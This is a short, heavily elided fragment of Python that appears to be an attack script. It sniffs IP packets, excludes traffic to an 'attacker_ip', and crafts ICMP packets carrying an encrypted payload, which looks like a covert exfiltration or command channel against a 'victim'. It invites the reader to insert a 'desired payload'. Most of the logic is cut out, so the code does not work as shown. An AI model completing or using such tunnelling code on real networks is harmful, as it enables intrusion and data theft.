...
def sniff_packets():
    def process_packet(packet):
        if packet.haslayer(IP):
            ...
            # Exclude packets sent by the attacker to avoid an infinite loop
            if destination_ip != attacker_ip:
                # Craft ICMP packet with encrypted payload
...
if __name__ == "__main__":
    ...
    victim.online_interaction()"""  # Replace with your desired payload
